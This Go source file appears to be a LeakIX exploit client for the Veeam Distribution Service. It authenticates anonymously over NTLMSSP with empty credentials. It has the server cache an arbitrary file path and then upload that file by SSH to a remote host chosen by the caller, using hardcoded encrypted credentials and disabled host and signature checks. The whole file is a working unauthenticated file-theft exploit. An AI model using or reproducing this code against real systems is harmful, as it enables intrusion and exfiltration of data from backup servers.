package v11

import (
	"encoding/xml"
	"errors"
	"github.com/LeakIX/nns"
	"github.com/LeakIX/ntlmssp"
	vdsclient "github.com/LeakIX/veeam-ds-client"
	"net"
	"strings"
	"time"
)

func GetConnection(network, addr string) (net.Conn, error) {
	ntlmsspClient, err := ntlmssp.NewClient(ntlmssp.SetCompatibilityLevel(1), ntlmssp.SetUserInfo("", ""))
	if err != nil {
		return nil, err
	}
	nnsConn, err := nns.DialNTLMSSP(addr, ntlmsspClient, 5*time.Second)
	if err != nil {
		return nil, err
	}
	conn := vdsclient.WrapConnection(nnsConn)
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	return conn, nil
}

func SendRequest(addr string, input RequestData, output interface{}) error {
	conn, err := GetConnection("tcp", addr)
	if err != nil {
		return err
	}
	defer conn.Close()
	xmlEncoder := xml.NewEncoder(conn)
	xmlDecoder := xml.NewDecoder(conn)
	err = xmlEncoder.Encode(input)
	if err != nil {
		return err
	}
	err = xmlDecoder.Decode(output)
	if err != nil {
		if strings.Contains(err.Error(), IsVeeam10Err.Error()) {
			return IsVeeam10Err
		}
	}
	return nil
}

func CacheFile(target, file string) error {
	vrequest := RequestData{
		FISpec: CacheRequest{
			RequestSpec: RequestSpec{
				FIScope:     190,
				FIMethod:    24,
				FISessionID: "00000000-0000-0000-0000-000000000000",
			},
			FilePath: file,
		},
	}
	var cacheReply CacheReply
	err := SendRequest(target, vrequest, &cacheReply)
	if err != nil {
		return err
	}
	if cacheReply.HasExceptions() {
		errTxt := ""
		for _, exception := range cacheReply.PlainException.KeyValue {
			errTxt += exception.Key + " : " + exception.Value + "\n"
		}
		return errors.New(errTxt)
	}
	if !cacheReply.IsFileInCache {
		return errors.New("could not cache file")
	}
	return nil
}

func DownloadFileSSH(target, file, remote string) error {
	vrequest := RequestData{
		FISpec: UploadRequest{
			RequestSpec: RequestSpec{
				FIScope:     190,
				FIMethod:    25,
				FISessionID: "00000000-0000-0000-0000-000000000000",
			},
			SystemType:                 "LNX",
			Host:                       remote,
			User:                       "rj722Go3FBVLp6bVjALRaiU=",
			Password:                   "cRm5B5VruRTLB9CoQY0FsACz5zOzcY9f",
			TaskType:                   "Package",
			SshCredentials:             "GpWHLzm/7SXGj41Jw/4hjQxZS+720vhx8nZplBufbS8eCkkUgY7gr0BV9+Q5uk7E1EmDtUm2QNSvCr95i5jVk95Wsow2OZ3VEoPjjDw/mao1FySleEXIuY8cUG2QNutqGbAA7maSMrLJRivxiPKty5kz0CzisMPXy2JzdYUtNdnhbSDcoh7wbg4sO5b9TLzMZ58xtXkgV0IEiX3Pl8rLp8ezFV3ca9N+CU6Mx4WTAUrlozUk2pbrqv0PUugQxFnQ2lsTN3V0SFdIaLRWj9b2h++Zi84uINmddEOCeZ97uAmIARQ7eNbYimY8MD3buZmoIpBpT5iAm3p2+arQT2XHt5zIVg196BM2zgWB1AcLBeXOznTDrpxdmKToRKSi6+qcPbtB0TwLdX78uV1h0fsHvw5uf59rKc5O3Qsmus7SazDdrfymadxnfST0sc6147hMzoV2nNKRHQmTYD6N9BFEJdJPG3yR5ASPwfpFmvJL54lCfJsHnX1gr4DETw9xKz+XnXwY6V1KgywsOuxeSVNP0KLfSjb2+wHIC1D7GGJoVblFN2O7O0wqyYsBIOrQKW6/GM/Dioir++V3q9bYDNijwHoSTcBJfkU3s2Cx2E/dTETWcrWOtPmFlFCW1/Xtw8BeNXQ+TW2E+8y2zhsEJtiK/1RckvS3QoBgA+gZcJMgIuLAnsdW7c+RU2HPraGvQIOO/MXR817RqhmjrePsq0aaopzg",
			SshFingerprint:             "0000",
			SshTrustAll:                true,
			IsWindows:                  false,
			IsFix:                      true,
			CheckSignatureBeforeUpload: false,
			DefaultProtocol:            3,
			FileRelativePath:           "/output",
			FileProxyPath:              file,
			HostIps: HostIps{
				String: []String{{Value: remote}},
			},
		},
	}
	var uploadReply UploadReply
	err := SendRequest(target, vrequest, &uploadReply)
	if err != nil {
		return err
	}
	if uploadReply.HasExceptions() {
		errTxt := ""
		for _, exception := range uploadReply.PlainException.KeyValue {
			errTxt += exception.Key + " : " + exception.Value + "\n"
		}
		return errors.New(errTxt)
	}
	return nil
}

var IsVeeam10Err = errors.New("expected element type <RIResponse> but have <EpCmResponse>")
